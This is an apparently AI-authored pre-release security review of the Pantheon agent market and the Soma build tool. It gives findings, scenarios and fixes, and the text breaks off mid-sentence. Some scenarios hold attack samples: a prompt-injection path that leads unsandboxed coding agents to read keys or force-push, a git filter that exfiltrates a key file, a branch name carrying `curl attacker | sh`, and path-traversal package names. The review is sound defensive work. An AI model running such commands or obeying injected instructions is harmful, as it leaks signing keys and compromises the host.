# Security review 2: Pantheon and Soma before open sourcing

A second, independent pass (Nov 8 2026), by a model given the brief in
this repository's history and clones of both repositories side by side, so
paths start with `pantheon/` or `soma/`. It supersedes the status column of
docs/SECURITY-REVIEW.md where they differ (H1 is partial: P-2).

Read-only review of the two trees in this folder:

- `pantheon/` — `github.com/yevbar/pantheon` at `master` (`c4f2539`)
- `soma/` — `github.com/yevbar/soma` at `gradual` (`840cd066c9`)

The brief asks for security problems that should be fixed, or at least
documented, before the repositories are public, with particular attention to
the line between them. No code was changed and no build was run. The tree
already contains an earlier review (`pantheon/docs/SECURITY-REVIEW.md`, whose
`c4f2539` commit fixed C1, C2, H1, H3 and H7); this is a second pass. It
confirms those fixes, reports what remains, and adds findings from the current
code. Small OCaml snippets were used only to confirm `Sys.executable_name` and
`Filename.concat` behaviour, and the hand-written SHA-256 in `somaHash.ml`
against standard vectors.

## Summary

The most important remaining problems are:

1. **The host deployment trusts every diplomat with every node key and the
   GitHub push credentials** (`scripts/host.sh`; already acknowledged in
   `docs/HOST.md`, but not in `docs/SAFETY.md`). A single prompt injection can
   read the keys or push directly to the default branch.
2. **The H1 fix is only complete when the model runs as a different user.**
   In the default `pantheon up` and `host.sh` setups the model shares the
   node's user and can still write the git directory used by `pantheon edits`,
   so a clean filter can run commands as the node.
3. **The shipped Docker CI likely cannot build Pantheon at all.** The opam
   root is read-only and its log directory is not a tmpfs, while Soma's OCaml
   build asks opam what the switch has; `ci-sandbox` handles this and the
   Docker path does not.
4. **Consensus locks are lost on restart**, which can break safety (H4).
5. **The build cache is trusted without rechecking** (H9): a forged
   `.soma-cache` or shared-cache entry can make CI pass with definitions the
   kernel never checked.
6. **`Rocq Library` uses an unvalidated package name as a path component**,
   so a hostile `.soma` can write or delete outside Soma's cache as the builder.
7. **The transaction pool can be locked up with future nonces** (H5), and the
   leader draw can still be ground by revealing any of the last 64 links.

A complete list follows, separated into "fix before public" and "document as a
known limit". A proof/claims section and a secrets/history section are at the
end.

## Answers to the brief's specific questions

- **Is a bid's code built and run in CI?** Only if the node was started with
  `--ci-repo`/`--ci`. `run_check` first applies the edits to a fresh clone and
  computes the tree (`shell.ml:920-935`), then runs the configured command in
  Docker or `ci-sandbox` (`:943-951`). The default command in
  `scripts/host.sh:49` and `scripts/sandbox.sh:291` is
  `soma build main.soma && test/edits.sh`: it builds the bid and runs the
  bid's own edit test. `soma-ci` builds Soma and a downstream Pantheon; it
  does not run Soma's full test suite. Without CI, a check only proves the
  edits apply.
- **Can a bid forge a passing result?** Yes. The test script is taken from
  the bid (P-7), a bid can print a Docker error to make attestors abstain
  (P-6), a tracked `.soma-cache` is trusted (S-1), and `soma build` accepts
  `Admitted`/`unk` proofs (S-4). The attestors' models are the remaining
  guard.
- **Can the leader grade its own work?** The leader cannot bid
  (`bidders_for` excludes it, `market.soma:141-148`; `apply "bid"` rejects
  the leader, `:265-266`) and cannot merge its own bid
  (`market.soma:291-292`; `market.proof:381-403`
  `leader_never_merges_its_own_bid`/`merge_needs_leader_and_others_bid`).
  Its approval is implicit in `approvals` (one of the three,
  `market.soma:214-215`), it does not attest (`:300-301`), and it chooses
  which bid to merge and runs its own check. A later leader can merge a bid
  left pending by an earlier term; the bidder keeps the credit
  (`finalize`, `market.soma:188-209`).
- **Can a merge be stolen?** Only the current leader's signed `merge`
  transaction creates a pending merge (`market.soma:285-295`), and only the
  leader can reject/close (`:311-334`); a non-leader cannot merge. A later
  leader can finish a pending bid, and `finalize` credits `bidder b`, so the
  work is not reassigned. The leader can still choose which bid to merge and
  can close a task, which is a liveness/selection power, not a transfer of
  credit.
- **How much do the guarantees depend on the shell?** The Soma proofs cover
  the market and consensus rules; the shell supplies `sha256`, `hash_list`,
  `decode_tx`, signatures, peer I/O, `apply_edits`, `git` and CI
  (`shell.definition`, `docs/DESIGN.md:18-20`). The shell is OCaml, not
  proved; a bug in it can break the guarantees the Soma proofs describe. The
  findings in P-2, P-4, P-6, P-13, P-16 and P-17 are shell-side.

---

## Status of the earlier review at `c4f2539`

| Earlier item | Status now | Where |
|---|---|---|
| C1 symlink contents in a signed bid | **Fixed** (index blobs, regular modes only) | `shell.ml:282-314`, `test/edits.sh:85-93` |
| C2 unary `Nat.of_uint` freeze | **Fixed** (`num_opt` 1–18 digits, one pass) | `util.soma:58-66`, `consensus.proof:5-9` |
| H1 `.git/config` commands | **Partial** — fixed when the model is another user; the checkout's `PANTHEON_GITDIR` is still model-writable when node and model share a user, and filters are not disabled | `shell.ml:897-905`, `test/edits.sh:95-105`; finding **P-2** |
| H2 host diplomats own every secret | **Open** | finding **P-1** |
| H3 connection/line/JSON DoS | **Partial** — caps added, but 64 × 31 MB and 4000 × 12.8 MB still fit | `shell.ml:474-477`, `consensus.soma:222-228`; finding **P-13** |
| H4 locks lost on restart | **Open** | finding **P-4** |
| H5 pool locked by future nonces | **Open** | finding **P-5** |
| H6 no secret scanning | **Open** (see secrets section; `model_env` is a blacklist) | `shell.ml:773-775`, secrets section |
| H7 endless CI output | **Fixed** (4 MB cap, kill at once) | `shell.ml:65,1266-1272` |
| H8 nested `.gitattributes` | **Open** | finding **P-14** |
| H9 build cache trusted | **Open** | finding **S-1** |
| H10 extraction/redirect writes anywhere | **Open** | finding **S-5** |

The earlier review's claim that H1 is tested is accurate for a hostile config
in the *checkout's* `.git`; the test does not put a hostile config in
`PANTHEON_GITDIR` itself.

---

# Fix before going public

## P-1. Pantheon: the host's diplomats own every key and the GitHub push credentials

**Severity: Critical (operational).** `scripts/host.sh:334-343` starts Claude
Code, Codex and the Cursor CLI with approvals off
(`--dangerously-skip-permissions`,
`--dangerously-bypass-approvals-and-sandbox`, `--yolo --trust`) as the same
user that owns `$P/net/*/key.json`, `$P/net/*/signed.log`, the node checkouts,
`$P/inbox.json` tokens and the host's `~/.ssh`/`gh` credentials. `docs/HOST.md:40`
already says a diplomat "could read the other nodes' keys"; `docs/SAFETY.md:45-60`
still presents "models are kept away from keys" as if it held on the host.

**Scenario.** A task, diff, rejection reason or CI output contains an
instruction (the fences in `agent.soma` only discourage) telling the diplomat
to run `cat ~/pantheon/net/claude/key.json`, or `git push --force` to the
default branch. The diplomat has full tool permissions and the same user; it
can read all four keys, forge votes, or bypass the mirror's "only what merged"
guarantee. A compromised provider session has the same reach.

**Fix.** Give each diplomat its own Unix user (or VM) with only its inbox
shared; run nodes and the mirror under another user with 0700 homes; keep the
push key out of the diplomat user. If that is too much for the first public
release, put it at the top of `docs/SAFETY.md` and `README.md` and protect the
default branch. The fix is not just documentation: the current `SAFETY.md`
claim is stronger than the code.

## P-2. Pantheon: the H1 fix leaves the git directory writable when node and model share a user

**Severity: High.** `shell.ml:897-905` creates a patch checkout with
`--separate-git-dir=gd`, where `gd = wt ^ ".git"` is a sibling of the worktree.
`shell.ml:282-314` then runs `git add -A` with `--git-dir=gd --work-tree=.`,
adding only `-c core.fsmonitor=false`. `scripts/bidder.sh:78-79,127` and
`scripts/bidder-inbox.sh:25-27` only chmod the worktree, not `gd`. In
`sandbox.sh` the model is the separate `bidder` user, so `gd` (owned by
`pantheon`, mode 755) is not writable; in `pantheon up` (the README) and
`scripts/host.sh` there is no `BIDDER_USER`, so the model is the node's user
and can write `gd/config` and `.gitattributes`.

**Scenario.** The model writes `gd/config`:

```
[filter "x"]
    clean = cat ~/pantheon/net/claude/key.json; cat
```

and `.gitattributes` with `* filter=x` in its checkout. `pantheon edits` runs
`git add -A`; git runs the clean filter as the node user, and the key is in
the signed bid. `core.fsmonitor` is disabled but filters are not. The existing
test (`test/edits.sh:97-105`) puts the hostile config in the checkout's `.git`,
not in `PANTHEON_GITDIR`, so it does not catch this.

**Fix.** Always run the model as a separate user (`BIDDER_USER`) and leave
`gd` node-owned and not writable; or run the node's git with a node-owned
config and filters disabled (a `--no-filters` read of the index, or a
read-only config). The `.git` pointer in the worktree is fine, but `gd` must
not be model-writable.

## P-3. Pantheon: the Docker CI image's opam root is read-only, so checks that build Pantheon likely fail

**Severity: High (availability).** `deploy/pantheon-ci.sh:11` sets
`OPAMROOT=/home/pantheon/.opam` and `XDG_CACHE_HOME=/tmp/cache`;
`shell.ml:943-950` runs the container with `--read-only` and a writable
`/tmp` but no tmpfs for the opam log; `deploy/Dockerfile:22` only does
`chmod -R a+rX /home/pantheon`. Soma's OCaml build calls
`opam list` (`toplevel/somaOcaml.ml:137-153`), and its own comment says opam writes
lock files and its log in `$OPAMROOT/log` even to list a switch. The host
sandbox solves this with `--tmpfs "$HOME/.opam/log"` (`ci-sandbox:46-47`);
the Docker path does not. `XDG_CACHE_HOME=/tmp/cache` also does not contain
the `installed-<digest>` record that the image's build wrote under
`/home/pantheon/.cache/soma/ocaml`, so `ensure_packages` asks opam every
time.

**Scenario.** Any check whose command is `soma build main.soma` (Pantheon's
default, and `soma-ci`'s downstream build) reaches `SomaOcaml.ensure_packages`
→ `installed_in` → `opam list` → a read-only `$OPAMROOT/log`. The check
fails with `asking opam what the switch has failed`, even though the code is
fine; the market cannot attest Pantheon changes. The e2e suite skips the
Docker CI when the image is absent, so this is easy to miss.

**Fix.** Add a writable opam log (a tmpfs or a copy of `$OPAMROOT` under
`/tmp`) to the Docker run, and either copy the image's `installed` record or
set `XDG_CACHE_HOME` to the image's cache for `soma`. Update
`deploy/sandbox/pantheon-docker` if the argument shape changes. Test the
Docker CI path, not only `ci-sandbox`.

## P-4. Pantheon: consensus locks are not persisted, so a restart can break safety

**Severity: High (safety).** `consensus.soma:28-36` keeps `lockr`, `lockv`,
`validr`, `validv` in memory. On restart the shell replays `blocks.log`
(`shell.ml:1100-1108`) but starts consensus at the next height with
`lockr = 0`; `signed.log` prevents a second vote for the *same*
height/round/kind, not a vote for a different value at a later round.
`docs/DESIGN.md:44-45` says a crash "loses nothing that had been agreed",
which is true of decided blocks but not of the lock.

**Scenario.** An honest node locks on value A at height h and precommits.
It crashes and restarts, loses the lock, and at round r+1 prevotes/precommits
B. With one Byzantine node, the Tendermint safety argument needs the honest
lock; two honest nodes can decide different blocks. The existing e2e
"node killed twice" scenario does not check this.

**Fix.** Persist the lock and valid round/value (synced before each
precommit) or rebuild them from `signed.log` at startup; add a restart-lock
e2e scenario. This needs a new chain or a compatible replay.

## P-5. Pantheon: 500 future-nonce transactions can lock the pool for good

**Severity: High (liveness).** `node.soma:27-28` (`poolable`) accepts any
nonce greater than the agent's next one; `node.soma:105` caps the pool at
500 overall. `market.soma:433-434` (`block_ok`) only admits the exact next
nonce, so the future-nonce entries never clear. `build_block` decodes the
whole pool on every event.

**Scenario.** A Byzantine agent (or any model) sends 500 signed transactions
with huge nonces; every honest node's pool is full; later posts, bids,
merges and the node's own transactions are refused. The chain stalls until
the entries are pruned (none are). The earlier review H5.

**Fix.** Admit only the next few nonces per agent (say 4), cap entries per
agent, expire old entries, and always admit the node's own next transaction.

## S-1. Soma: the build cache and shared cache are trusted without rechecking

**Severity: High (Soma); Medium for Pantheon.** `somaImport.ensure`
(`somaImport.ml:445-456`) considers a cached `.vo` fresh when the `.stamp`
(`:288-306`) says its source hash and import digests match. The `.stamp`,
`load-paths` (`:350-378`) and the `.vo` are all in the project's
`.soma-cache`, which a hostile project can carry. The shared cache
(`soma.ml:299-340`) is keyed only by project source files (MD5 via OCaml's
`Digest`), ignores the Soma/toolchain, and publishes whatever is in
`.soma-cache` first-writer-wins. The freshness record
(`soma.ml:1080-1113`) is likewise a plain file the project can forge.

**Scenario.** A project (or a checkout with a committed `.soma-cache`)
supplies a `.vo` and a matching `.stamp`; `soma build` loads the `.vo`
without the kernel rechecking it, so a false theorem or different definitions
pass. For Pantheon, a bid can add `.stamp`/`load-paths` text (they are text)
and rely on a tracked `.vo`; a person or a binary worker can commit the
`.vo` (a normal text bid skips binary files in `edits_of_checkout`). The
shared cache can be poisoned by any local build with the same source key,
and a later clean checkout restores the attacker's definitions. The earlier
review reproduced both.

**Fix.** Do not trust a `.soma-cache` that git tracks or that this machine
did not write; include the Soma and toolchain digests in the shared-cache
key; publish only what this build wrote, atomically; make the shared cache
opt-in for untrusted checkouts; recheck a `.vo` with `rocqchk` (or load it
with a provenance digest) when it comes from the project.

## S-2. Soma: `Rocq Library` uses an unvalidated package/version as a path component

**Severity: High (Soma); Medium for Pantheon.** `plugins/soma_rocq/soma_rocq.ml:275-323`
computes the cache directory as

```
Filename.concat root (package ^ "." ^ version ^ "-" ^ key)
```

where `package` and `version` come from `Rocq Library "PKG" "VER" in "DIR".`
in an untrusted `.soma`; `ensure` then does `remove_tree dir`, `mkdir_p dir`,
`copy_tree`, and compiles there. There is no validation of `package` or
`version` (unlike `SomaProject.parse_path`), and `package` is also passed to
`opam show/source`.

**Scenario.** A bid contains
`Rocq Library "../../../../tmp/x" in "."`. `dir` escapes
`$XDG_CACHE_HOME/soma/rocq`; `remove_tree`/`mkdir_p`/`copy_tree` write or
delete at the traversed path as the builder. A target directory has to end
in `.<version>-<key>` to be removed, but the attacker controls `package` and
`version` and can create such a directory (for example under `/tmp`), and
`mkdir_p`/`copy_tree` write outside the cache. On `host.sh` or `pantheon up`
the builder is the node's user. A `package` beginning with `-` is also
passed to opam as an option.

**Fix.** Require a safe single component for `package` and `version`
(letters, digits, `.`, `_`, `-`, no `/`, no `..`, no leading `-`), then
canonicalize the result under the cache and reject anything that escapes.

## P-6. Pantheon: a bid can make attestors abstain by printing a Docker error

**Severity: Medium.** `shell.ml:957-958` decides `docker_down` by searching
the CI output for `Cannot connect to the Docker daemon` or `Unable to find
image`; `:972` turns that into `node problem: ...`, and `:983` sets
`stage = node`. `agent.soma:371-374` (`abstain`) then sends no vote.

**Scenario.** A bid's `test.sh` prints `Cannot connect to the Docker
daemon`; every attestor classifies the check as its own problem and
abstains; the leader plus the fallback bidder is only two approvals, so the
merge cannot reach three. A bidder can stall its task at will. (The earlier
review's "how" fix handles exit 137/124 but not `docker_down`.)

**Fix.** Decide Docker failure from the node's own exit/prefix and a separate
probe, not from the bid's stdout; or ignore bid output entirely for
`docker_down` and use the node's `how` string.

## P-7. Pantheon: a bid can forge a passing CI by editing the test it runs

**Severity: Medium.** The default CI is `soma build main.soma &&
test/edits.sh` (`scripts/host.sh:49`, `scripts/sandbox.sh:291`), and
`test/edits.sh` is taken from the bid's checkout. The Soma CI
(`deploy/sandbox/soma-ci`) builds but does not run Soma's test suite.

**Scenario.** A bid changes `test/edits.sh` to `exit 0` (or changes `main.soma`
to a trivial program) and the attestors' CI passes. The CI is a build check,
not an independent test of the bid; the only other guard is the model review.
This is the "forge a passing result" part of the brief.

**Fix.** Run the head's test script from a trusted copy (or a fixed test),
or include a hash of the test in the CI command; make it explicit in
`SAFETY.md` that CI is only as strong as the test the bid can edit.

## P-8. Pantheon: the leader draw can be ground by revealing an old link

**Severity: Medium.** `market.soma:234-236` (`reaches`) accepts a reveal that
hashes to the agent's tip in 1 to 64 steps; `:336-340` accepts it. The
honest shell reveals exactly one step, but a Byzantine node can send a
`reveal` transaction for any link 2..64 back. The agent is then "revealed",
not in `held_back`, so it pays no next-draw penalty. `docs/DESIGN.md:70-80`
says "a value is fixed in advance" and "revealing is all an agent controls",
which is not what the code checks.

**Scenario.** The last revealer tries up to 64 links and picks the seed that
makes a chosen agent leader; it can do this without withholding, so the
`holding_back_bars_you_from_the_next_draw` proof does not cover it. With four
agents the effect is the same as the documented withholding attack but
without its cost, and with more reveals it is a larger choice.

**Fix.** Require exactly one step (`sha256 v = tip`) or a committed index;
update `DESIGN.md`/`PROOFS.md`; add a test. If the 64-link window is
intentional, document it and its cost.

## P-9. Pantheon: genesis accepts more than four agents or duplicate names

**Severity: Medium.** `shell.ml:400-405` only checks `List.length files < 4`;
it does not require exactly 4, unique names or unique public keys. The
consensus derives `f = (n-1)/3` and `quorum = n - f`
(`consensus.soma:38-40`), but the market hardcodes "3 of 4" in
`approvals`/`settle` (`market.soma:214-215`).

**Scenario.** A `parts/` with five files is accepted; consensus uses
`f=1`, `quorum=4` for five nodes, while the market merges on three
approvals. Two files naming the same agent (or the same key) make
`agents`/`pubkeys` ambiguous and the quorum count wrong. Every node gets the
same bad genesis, so they agree on an unsafe rule.

**Fix.** Require exactly four parts, unique names and unique keys; or derive
the approval threshold from `n`/`f` in Soma. Add a genesis test.

## P-10. Pantheon: a relative `Sys.executable_name` breaks checks and edits

**Severity: Medium (availability).** `shell.ml:903` puts
`PANTHEON_BIN = Sys.executable_name` in a model's environment, and `:931`
starts the `check` subprocess with `Sys.executable_name`. `start_job`
(`:751-765`) changes the process directory to a temporary directory before
`create_process_env`. On macOS, OCaml returns `./main.exe` when the node is
started as `./main.exe` (verified on this machine; on some systems it is
absolute); the README and docs use exactly that form.

**Scenario.** `./main.exe up` starts the nodes; an attestor's
`check` subprocess runs `./main.exe check ...` from a temp directory and
fails; the agent abstains (`node problem`), so merges cannot be attested. A
`cmd:` backend's `PANTHEON_BIN=./main.exe` also fails in `bidder.sh`'s
`exec "$PANTHEON_BIN" edits .` after `cd "$PANTHEON_WORKTREE"`.

**Fix.** Make the executable path absolute at startup (`Unix.realpath` or
`Filename.concat (Sys.getcwd ()) Sys.executable_name`) and use that for
`PANTHEON_BIN`, `check`, and `up`.

## P-11. Pantheon: the host's branch name is pasted unquoted into a shell wrapper

**Severity: Medium.** `scripts/host.sh:56-57` takes `BRANCH` from the
remote's default branch (or the environment); `:100` writes
`PANTHEON_BRANCH=$BRANCH` into `backend.sh` unquoted; `:111-114` pastes it
into a Python literal; `:153` and `:195` also use it. Git ref names may
contain `;`, `$`, quotes and other shell metacharacters.

**Scenario.** A compromised or malicious remote (or a collaborator) sets the
default branch to `x; curl attacker | sh`. When a diplomat runs its
`pantheon-inbox` wrapper, the command runs as the host user. The same string
can break the systemd unit and the publish command.

**Fix.** Validate `BRANCH` as a git ref (no whitespace/metacharacters) and
quote it everywhere, or pass it through a config file.

## P-12. Pantheon: `ci-sandbox` exposes the host's `/etc`, and CI output is put on chain

**Severity: Medium.** `deploy/host/ci-sandbox:42-52` binds `/etc` read-only
into the sandbox. `shell.ml:976-981` puts the last 400 characters of a failed
check's output into the rejection reason, which is replicated and shown to
the other models. `docs/SAFETY.md:62-67` says "CI can't reach anything".

**Scenario.** A bid's CI prints a file under `/etc` (for example a host's
`/etc/pantheon/keys.env`, which `deploy/sandbox/provision.sh:136` and
`scripts/sandbox.sh:196-199` use in the sandbox deployment, or any other host
`/etc` secret); the value is in a rejection, in `blocks.log`, and in the
other agents' prompts. In the Docker CI image `/etc` is the image's, so this
is specifically the `ci-sandbox` path.

**Fix.** Bind only the `/etc` files a build needs (or a minimal tmpfs), run
CI as a user that cannot read the node's key files, and redact or hash the
rejection text.

## S-3. Soma: `soma.lock`'s commit is not validated

**Severity: Medium.** `somaDeps.read_lock` (`:174-202`) accepts any string for
`commit`; `source_dir`/`fetch` (`:116-151`) put it in a directory name and
`cache_of` (`:400-406`) uses it as a path component. A leading `-` also
reaches `git checkout`/`fetch` as an option.

**Scenario.** A hostile `soma.lock` sets `commit = "../../../../tmp/x"`.
`fetch` builds `dir` with `..`, calls `remove_tree tmp` and `mkdir_p` before
the fetch can fail; `cache_of` can write compiled files outside
`.soma-cache/.deps`. A commit that resolves must avoid `..`, but the
traversal/deletion happens before checkout, and the cache path is used even
when it later fails. The earlier review's Medium.

**Fix.** Require 40 hexadecimal digits (or a validated full ref) and reject
anything else; canonicalize the cache path under the project.

## S-4. Pantheon/Soma: `soma build` accepts proofs that rest on assumptions; CI does not run `soma explore`

**Severity: Medium (proof claims).** `soma build` checks a `.proof`, but
accepts `Admitted`, `Axiom`/`Parameter`, and `unk`/`err`/casts;
`soma explore` reports these as issues
(`plugins/soma_explore/soma_explore.ml:441-449`) and `soma hash` records
them as assumptions. The Pantheon CI command is `soma build main.soma`
(`scripts/host.sh:49`, `scripts/sandbox.sh:291`); the Soma CI is
`dune build` plus a downstream build (`deploy/sandbox/soma-ci`). Neither runs
`soma explore`/`soma compile`.

**Scenario.** A bid changes a `Qed` to `Admitted`, or proves a theorem with
`unk`, and CI passes; `docs/SAFETY.md`/`docs/PROOFS.md` then claim more than
the checked proof shows. `soma hash` would show the new assumption, but
nothing compares it. This is exactly "what a proof checked by Soma means".

**Fix.** Run `soma explore` or `soma compile` in CI, or compare `soma hash`
assumptions before and after and reject new ones; say "checked" rather than
"proved" in the docs where assumptions are allowed.

## S-5. Soma: building an untrusted project can run code and write outside the project

**Severity: High for Soma standalone; Medium for Pantheon.** The build path
runs code from the project:

- `toplevel/somaOcaml.ml:168-203` runs `opam install` (package build
  scripts), and `:494-496` runs `dune build` (ppx and project `.ml`/dune
  rules).
- `toplevel/somaMirage.ml:664-675` runs `mirage configure`, `make depends`
  and `make build`.
- `plugins/soma_rocq/soma_rocq.ml:288-298` runs `opam source`; a Rocq
  library's `.v` can
  `Redirect`/`Extraction` because `soma_rocq.clean_env` removes the
  `SOMA_PROJECT_PREFIX` that `refuse_in_dependency` checks.
- `plugins/extraction/extract_env.ml:746` and `vernac/synterp.ml:386` refuse
  writes only in a dependency; the project being built can
  `Extraction "/abs/path"` or `Redirect`.
- `plugins/soma_lean` runs Lean, which evaluates `#eval` and may fetch a
  `lean-toolchain`.

`GRADUAL.md:440-444` says "This is not a sandbox", but it understates the
`[opam]`/dune/Mirage/Lean paths. In `pantheon up`/`host.sh` the model's own
`soma build` runs as the node's user; in CI the Docker/`ci-sandbox` limits
it, but the model's local build is not sandboxed.

**Scenario.** A bid's `soma.toml` has `[opam]` with a package whose build
script does something, or a `.ml`/dune rule that runs a command; the build
executes it as the builder and can read the builder's files (keys when it is
the node's user) or write outside the checkout. A `.soma` can
`Extraction "/home/pantheon/...` or `Redirect`; a `Rocq Library` can write.

**Fix.** Run untrusted builds as a user without keys and without network
(or in a container), confine `Extraction`/`Redirect` output to the project,
and document the trust boundary. At minimum, use `BIDDER_USER` for every
model that runs `soma build`.

## P-13. Pantheon: message/log memory is still a DoS

**Severity: Medium.** `shell.ml:474-477` allows 64 inbound connections and a
31 MB line; `:1228-1237` buffers and parses a line before authentication.
`consensus.soma:222-228` keeps up to 4000 messages per height, and does not
require votes to have empty values. A 50-transaction block is 12.8 MB.

**Scenario.** A no-key attacker opens 64 connections and sends 31 MB of flat
JSON (not deep, so `shallow_json` passes): about 2 GB of buffers, and a
parse per line. A Byzantine peer sends 4000 messages of 12.8 MB vote values
(about 51 GB) or many large proposals; the node parses and keeps them. The
H3 fix capped depth and connections but not total bytes or vote values.

**Fix.** Authenticate peers before buffering, cap total buffered bytes per
connection and overall, require prevotes/precommits to carry no value, cap
proposals per round, and cap the log by bytes rather than count.

## P-14. Pantheon: a nested `.gitattributes` can freeze a repository

**Severity: Medium.** The default deny list (`agent.soma:31`) includes
`.gitattributes` and `.gitmodules`, but `violation` uses `starts d p`
(`agent.soma:48-53`), so `sub/.gitattributes` is allowed. `safe_path`
(`shell.ml:136-138`) only excludes `.git`, not these files. The check clone
and the long-lived node checkout can apply attributes differently.

**Scenario.** A bid adds `sub/.gitattributes` with `* text eol=crlf`, then a
later bid whose `old` text has CRLF passes the check/approval and fails to
apply on every node; the repository stops merging. The earlier review
reproduced this.

**Fix.** Deny `.gitattributes` and `.gitmodules` in any path component and in
any case; make the deny match per component; apply merges on a fresh clone as
the check does.

## P-15. Pantheon: the CI lock file descriptor reaches the sandbox

**Severity: Low/Medium.** `deploy/host/ci-sandbox:34-35` holds `flock` on fd
9, and the `systemd-run`/`bwrap` child inherits it. `soma-dev-build` and
`pantheon-docker` also hold locks on inherited descriptors.

**Scenario.** A bid's CI command runs `flock -u 9` and releases the host-wide
lock, then runs several memory-heavy builds at once; the host's memory cap
(the reason for the lock) is no longer enforced.

**Fix.** `bwrap --close-fd 9` (or `exec 9>&-` in the child) after the lock is
taken; keep the lock in a process that the sandbox cannot see.

## P-16. Pantheon: a model's JSON reply is parsed without a depth/size bound

**Severity: Medium (availability).** `shell.ml:510-513` (`json_in_reply`)
parses up to `max_job_output` (4 MB) of model output with
`Yojson.Safe.from_string`, and `:494-508` (`flatten_reply`) recurses over it.
The peer-message `shallow_json` guard (`:80-91`) is not used for model
replies.

**Scenario.** A malicious or compromised model returns 4 MB of nested `[`/`{`
(a valid, deeply nested JSON value). `Yojson`/`flatten_reply` recurse; the
node's stack or memory is exhausted and the node exits, losing its turn.
With one Byzantine agent, this is a liveness attack. A flat 4 MB reply with
millions of keys is also parsed and flattened into a large list.

**Fix.** Apply a depth cap (reuse `shallow_json`) before parsing a model
reply, cap the number of keys/values, and make `flatten_reply` iterative.

## P-17. Pantheon: a NUL in a task spec can stop every node from committing a merge

**Severity: Medium (consistency).** `market.soma:258` stores any spec string;
`finalize` (`market.soma:193,208`) emits it in the `merge` output;
`shell.ml:1008` puts it in the `git commit -m` argument.

**Scenario.** JSON can carry `\u0000`, which becomes a NUL in the OCaml
string; `Unix.create_process`/git see a truncated or failed argument.
`apply_merge` (`shell.ml:1010-1013`) then diverges on every node, which stops
taking merges for that repository. The leader controls the spec (and may be
the one faulty node). The earlier review's Medium.

**Fix.** Reject NUL/control characters in specs and notes at `post`/`bid`, or
pass the commit message with `-F`/stdin; add a test.

---

# Document as known limits (or fix when convenient)

| Item | Where | Why it is a limit |
|---|---|---|
| Two faulty agents | `docs/SAFETY.md:88` | Beyond f=1 by design. |
| Draw withholding | `docs/DESIGN.md:70-80` | Documented, but the 64-link grind (P-8) is not. |
| No membership changes | `docs/DESIGN.md:117` | New genesis; documented. |
| Prompt injection is fenced, not prevented | `docs/SAFETY.md:92-94` | The model can still be fooled. |
| CI is only as strong as its command | `docs/SAFETY.md:95-96` | Made worse by P-7 (the bid can edit the test). |
| Soma is not a sandbox | `GRADUAL.md:440-444` | Understates opam/dune/Mirage/Lean (S-5). |
| Lean theorems are axioms to Soma | `theories/Soma/Lean.v` | Trusted as Lean's kernel; `soma explore` lists them. |
| `model_env` strips only `PANTHEON_*` | `shell.ml:773-775` | Other secrets in the node's environment reach the model; use an allowlist. |
| No secret scanning anywhere | `agent.soma:48-53`, `shell.ml:1000-1013` | A model can put a key in a bid; the chain keeps it. Add a scan before attest/merge (H6). |
| Inbox HTTP is unbounded threads | `scripts/inbox-http.py:256-263` | A token holder can open many waits; add a pool/per-token limit. |
| `pantheon-inbox` claim is not atomic; `skip` JSON can be invalid | `scripts/pantheon-inbox:45-69,84-89` | Two waiters can claim; control characters in `why` break JSON. |
| Soma `Declare ML Module` is refused by a text search | `soma_rocq.ml:209-213` | `Declare  ML  Module` (extra spaces) loads a plugin; the docs say refused. |
| `OCaml Bind`/`Wasm Bind` take arbitrary paths; `project_cache_key`/`copy_tree` follow symlinks | `soma_ocaml.ml:255-258`, `soma.ml:290-318` | A file name can read outside the project; a symlink loop can make a build hang. |
| CI time is one hour, CPU is unlimited; Soma's build has no timeout of its own | `shell.ml:951`, `deploy/host/ci-sandbox`, `soma-ci` | A bid can consume the CI slot; `timeout`/`flock -w`/CPU limits would help. |
| `blocks.log`, tasks, `served`, `signed.log` grow without bound | `shell.ml`, `market.soma` | Long-running chains use disk/memory; prune or document. |
| `reference/go/` was not audited here | `pantheon/reference/go` | It is kept for comparison; the review focused on the Soma version. |
| Personal data in history/docs | see below | Author emails, GitHub user, host name; decide before public. |

Smaller items, not detailed above:

- `pantheon-inbox pull` accepts a branch name from the agent as a `git fetch`
  refspec (`scripts/pantheon-inbox:127-139`); a branch starting with `-` or
  containing `:` can change which ref is fetched. Validate it as a branch.
- `publish.sh`/`mirror.sh` pass `remote` and `branch` to git without a
  leading-`-` guard (`scripts/publish.sh:29-35,43-50`); a remote URL or
  branch from a config can be read as an option.
- `status.txt`, the node log and `git` errors can contain model text with
  terminal escapes, and are not redacted (`shell.ml:1056`, `:1059`);
  `signed.log`/`blocks.log` are mode 0644 in a 0700 home, so a model sharing
  the node's user can read every bid/spec.
- `soma`'s `somaToml` multiline-string closing allows only two extra quotes
  (`somaToml.ml:185-215`); `soma diff` builds a TOML line with a folder path
  in single quotes (`somaDiff.ml:142-145`), so a path containing `'` breaks
  the generated project.
- `somaOcaml.ocaml_type` uses `List.hd` on `list`/`option`/`prod` arguments
  without checking arity (`plugins/soma_ocaml/soma_ocaml.ml:159-165`); a
  `.definition` such as `x : list.` can raise `Failure` and fail the build.
- `soma_wasm` runs the reference interpreter (`Wasm.Eval.invoke`, with its
  `Exhaustion` budget; `plugins/soma_wasm/soma_wasm.ml:401-422`); a hostile
  `.wasm` can still be expensive enough to use a CI slot. Check the fuel and
  add a wall-clock bound for untrusted modules.
- `soma`'s `soma build --check-fresh` reads paths out of a record with
  `Scanf.unescaped` (`topbin/soma.ml:1106-1112`); a forged record can make it
  read outside the cache (same trust issue as S-1).
- `reference/go/` is kept for comparison and was only secret-scanned here;
  it is not part of the Soma implementation and was not audited in depth.
- Edit matching is quadratic (`shell.ml:185-192` `positions`, used by
  `apply_edits` in the node's main loop); a large file plus a long `old`
  string can stall every node on a merge. Use a linear search and cap sizes.
- A peer can ask for old heights repeatedly (`consensus.soma:223-224`,
  `shell.ml:1035-1048`); each answer signs up to 51 blocks. Rate-limit per
  peer and cache signed answers.
- Muse's VM reaches every port on the host's localhost
  (`scripts/host.sh:52`, `VM_HOST=192.168.5.2`), including the nodes' ports;
  a compromised VM can send unsigned lines and consume the node's connection
  budget. Use a network mode that only allows the inbox port.
- `[opam]` versions are installed into the shared switch
  (`toplevel/somaOcaml.ml:168-203`); a project can downgrade a package the
  node's later builds use, and package build scripts/ppx run at build time.
  Pin a switch per project or make version changes explicit.
- `PANTHEON_BYZ` turns off the double-sign guard in the production binary
  (`shell.ml:606-607,728-743`); set it only for tests.
- `write_keep_mode`'s temporary file is not opened with `O_NOFOLLOW`
  (`shell.ml:204-209`); a same-user race can replace it. Paths that differ
